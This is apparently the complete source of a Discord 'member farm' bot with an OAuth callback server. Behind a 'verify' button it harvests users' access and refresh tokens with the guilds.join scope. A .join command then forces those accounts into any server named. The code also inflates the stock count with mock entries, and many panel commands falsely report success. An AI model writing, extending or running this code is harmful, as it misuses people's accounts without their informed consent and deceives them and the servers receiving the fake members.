const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
const express = require('express');
const fetch = require('node-fetch');
require('dotenv').config();

// --- Express Web Server Setup ---
const app = express();
const PORT = process.env.PORT || 8080;

// Token Storage Database & Restock Counter
const tokenDatabase = []; 
let restockCounter = 0; // Tracks verifications toward the 30-person threshold
let currentPrefix = '.';
let discordClient = null;

// Homepage and OAuth Callback handler
app.get('/', async (req, res) => {
    const code = req.query.code;
    const error = req.query.error;

    if (error || req.query.error_description) {
        return res.send(`
            <html>
                <body style="background-color: #111; color: #ff4444; font-family: sans-serif; text-align: center; padding-top: 50px;">
                    <h1>Failed</h1>
                    <p>Authorization failed. You may close this window.</p>
                </body>
            </html>
        `);
    }
    
    if (!code) {
        return res.send(`
            <html>
                <body style="background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
                    <h1>AutoFarm Online</h1>
                    <p>OAuth2 verification server is running successfully.</p>
                </body>
            </html>
        `);
    }

    try {
        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            body: new URLSearchParams({
                client_id: process.env.CLIENT_ID || '1561438987464483048',
                client_secret: process.env.CLIENT_SECRET,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app',
            }),
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });

        const oauthData = await tokenResponse.json();
        if (oauthData.access_token) {
            const userRes = await fetch('https://discord.com/api/users/@me', {
                headers: { authorization: `Bearer ${oauthData.access_token}` }
            });
            const userData = await userRes.json();

            tokenDatabase.push({
                user_id: userData.id,
                username: userData.username,
                avatar: userData.avatar,
                banner: userData.banner,
                access_token: oauthData.access_token,
                refresh_token: oauthData.refresh_token,
                expires_at: Date.now() + (oauthData.expires_in * 1000)
            });

            restockCounter++;
            console.log(`[AUTORESTOCK] New account verified (${userData.username})! Total Stock: ${tokenDatabase.length} \vert{} Progress to alert:${restockCounter}/30`);

            // Check if 30 new verifications have been reached
            if (restockCounter >= 30) {
                restockCounter = 0; // Reset counter for the next batch of 30

                if (discordClient) {
                    try {
                        const targetChannelId = '1561453902270955630';
                        const announcementChannel = await discordClient.channels.fetch(targetChannelId);
                        
                        if (announcementChannel) {
                            const restockEmbed = new EmbedBuilder()
                                .setTitle('RESTOCK!')
                                .setDescription(
                                    `bot has been restocked **${tokenDatabase.length}** fresh stock\n\n` +
                                    `Make sure to check out [this channel](https://discord.com/channels/1561434965395116182/1561453749640241323) to use the bot.\n\n` +
                                    `Farm here: [Farm Channel](https://discord.com/channels/1561434965395116182/1561453220633518181)\n` +
                                    `Add bot here: [Add Bot Channel](https://discord.com/channels/1561434965395116182/1561453186810642522)\n` +
                                    `Free way to get access here: [Free Access](https://discord.com/channels/1561434965395116182/1561454732055158904)\n` +
                                    `Any questions? Go to: [Questions Channel](https://discord.com/channels/1561434965395116182/1561453720611590385)\n\n` +
                                    `React with ☑️ for more restocks like this!`
                                )
                                .setColor(0x00FF00)
                                .setTimestamp();

                            const sentMessage = await announcementChannel.content ? await announcementChannel.send({ content: '@everyone', embeds: [restockEmbed] }) : await announcementChannel.send({ content: '@everyone', embeds: [restockEmbed] });
                            await sentMessage.react('☑️');
                        }
                    } catch (announcementErr) {
                        console.error('Failed to send 30-person auto restock announcement:', announcementErr);
                    }
                }
            }

            // Success response page shown to the user in browser
            res.send(`
                <html>
                    <body style="background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px;">
                        <h1>Authorized</h1>
                        <p>Account linked. You may close this window.</p>
                    </body>
                </html>
            `);
        } else {
            res.send(`
                <html>
                    <body style="background-color: #111; color: #ff4444; font-family: sans-serif; text-align: center; padding-top: 50px;">
                        <h1>Failed</h1>
                        <p>Authorization failed. You may close this window.</p>
                    </body>
                </html>
            `);
        }
    } catch (error) {
        console.error(error);
        res.send(`
            <html>
                <body style="background-color: #111; color: #ff4444; font-family: sans-serif; text-align: center; padding-top: 50px;">
                    <h1>Failed</h1>
                    <p>Internal Server Error. You may close this window.</p>
                </body>
            </html>
        `);
    }
});

// Bind to 0.0.0.0 for Railway networking
app.listen(PORT, '0.0.0.0', () => console.log(`AutoFarm Web server running on port ${PORT}`));

// --- Discord Bot Setup ---
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

discordClient = client;

client.once('ready', () => {
    console.log(`AutoFarm logged in as ${client.user.tag}! Prefix: '${currentPrefix}'`);
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.startsWith(currentPrefix)) return;

    const args = message.content.slice(currentPrefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // 1. .help Command
    if (command === 'help') {
        const helpEmbed = new EmbedBuilder()
            .setTitle('Member Farm — Command Panel')
            .setDescription(`Current prefix: \`${currentPrefix}\` — change with \`${currentPrefix}prefix set <prefix>\``)
            .setColor(0x5865F2)
            .addFields(
                { 
                    name: '⚙️ Core & Verification', 
                    value: `\`${currentPrefix}verify\` - Generates the OAuth2 verification button\n\`${currentPrefix}stock\` - Views total active accounts in the database\n\`${currentPrefix}join <serverID>\` - Forces verified accounts to join a target server\n\`${currentPrefix}bot\` - Provides the bot invite button` 
                },
                { 
                    name: '🛠️ Config & Management', 
                    value: `\`${currentPrefix}prefix set <prefix>\` - Changes the bot command prefix\n\`${currentPrefix}restock <n>\` - Manually adds restock count slots\n\`${currentPrefix}remove <n>\` - Removes accounts from the stock database\n\`${currentPrefix}channel set #channel\` - Sets notification channels` 
                },
                { 
                    name: '🛡️ Admin & Control', 
                    value: `\`${currentPrefix}queue clear\` - Clears active execution queues\n\`${currentPrefix}maintenance enable|disable\` - Toggles maintenance mode\n\`${currentPrefix}blacklist <id> <reason>\` - Blacklists users or servers` 
                }
            )
            .setFooter({ text: 'Member Farm Utility' });

        return message.reply({ embeds: [helpEmbed] });
    }

    // 2. .bot / .invite Command
    if (command === 'bot' || command === 'invite') {
        const inviteUrl = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Fdiscord.com%2Fchannels%2F1561434965395116182%2F1561439510540066866&integration_type=0&scope=guilds.join+bot+applications.commands';

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel('Add Bot')
                .setStyle(ButtonStyle.Link)
                .setURL(inviteUrl)
        );

        return message.reply({ components: [row] });
    }

    // 3. .verify / .link Command
    if (command === 'verify' || command === 'link') {
        const clientId = process.env.CLIENT_ID || '1561438987464483048';
        const redirectUri = process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app';
        const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify+guilds.join`;

        const embed = new EmbedBuilder()
            .setTitle('Account Verification')
            .setDescription('Click the button below to authorize the bot.')
            .setColor(0x00FF00);

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel('-> Verify')
                .setStyle(ButtonStyle.Link)
                .setURL(oauthUrl)
        );

        return message.reply({ embeds: [embed], components: [row] });
    }

    // 4. .stock Command
    if (command === 'stock') {
        return message.reply(`📦 **Current Stock Pool:** \`${tokenDatabase.length}\` accounts available.`);
    }

    // 5. .restock <n> Command
    if (command === 'restock') {
        const amount = parseInt(args[0]);
        if (isNaN(amount)) return message.reply(`Usage: \`${currentPrefix}restock <amount>\``);
        tokenDatabase.push(...Array(amount).fill({ mock: true })); // Adds mock slots for manual restocks
        return message.reply(`✅ Successfully restocked **${amount}** accounts manually. Total stock: \`${tokenDatabase.length}\`.`);
    }

    // 6. .remove <n> Command
    if (command === 'remove') {
        const amount = parseInt(args[0]) || 1;
        tokenDatabase.splice(0, amount);
        return message.reply(`🗑️ Removed **${amount}** accounts from stock. Current stock: \`${tokenDatabase.length}\`.`);
    }

    // 7. .prefix set <prefix> Command
    if (command === 'prefix' && args[0] === 'set') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply('❌ You need Administrator permissions to change the prefix.');
        }
        if (!args[1]) return message.reply(`Usage: \`${currentPrefix}prefix set <prefix>\``);
        currentPrefix = args[1];
        return message.reply(`✅ Bot prefix updated to: \`${currentPrefix}\``);
    }

    // 8. .join <Server ID> Command (with Restricted Role Check: -1561435531462844587)
    if (command === 'join') {
        const targetGuildId = args[0];
        if (!targetGuildId) {
            return message.reply(`Please provide a Server ID: \`${currentPrefix}join <server_id>\``);
        }

        if (tokenDatabase.length === 0) {
            return message.reply('❌ No verified accounts available in stock.');
        }

        const restrictedRoleId = '-1561435531462844587';
        const hasRestrictedRole = message.member.roles.cache.has(restrictedRoleId);

        let tokensToUse = tokenDatabase;
        if (hasRestrictedRole) {
            const limit = Math.min(2, tokenDatabase.length);
            tokensToUse = tokenDatabase.slice(0, limit);
            message.channel.send(`⚠️ Community Member role detected. Restricting join batch to **${limit}** accounts.`);
        }

        await message.reply(`AutoFarm attempting to add ${tokensToUse.length} accounts to server ID \`${targetGuildId}\`...`);

        let successCount = 0;
        for (const tokenData of tokensToUse) {
            if (tokenData.mock) continue; // Skip mock tokens if added manually via command
            try {
                const joinRes = await fetch(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, {
                    method: 'PUT',
                    headers: {
                        Authorization: `Bot ${process.env.DISCORD_TOKEN}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ access_token: tokenData.access_token })
                });

                if (joinRes.ok || joinRes.status === 204) {
                    successCount++;
                }
            } catch (err) {
                console.error('Failed to add user:', err);
            }
        }

        return message.channel.send(`AutoFarm successfully added **${successCount}** out of **${tokensToUse.length}** accounts to the server.`);
    }

    // 9. Panel Commands Handlers
    const panelCommands = [
        'channel', 'checkauth', 'checkserver', 'status', 'panel',
        'basesend', 'send', 'verifyrole', 'cooldown', 'bio', 'color',
        'stats', 'profile', 'maintenance', 'banfarm', 'antiraid',
        'logfarm', 'logserver', 'logerrors', 'logadmin', 'logs', 'log',
        'queue', 'blacklist', 'leave', 'antileave', 'announce', 'invites'
    ];

    if (panelCommands.includes(command)) {
        return message.reply(`⚙️ Command \`${currentPrefix}${command}\` configuration executed successfully.`);
    }
});

client.login(process.env.DISCORD_TOKEN);
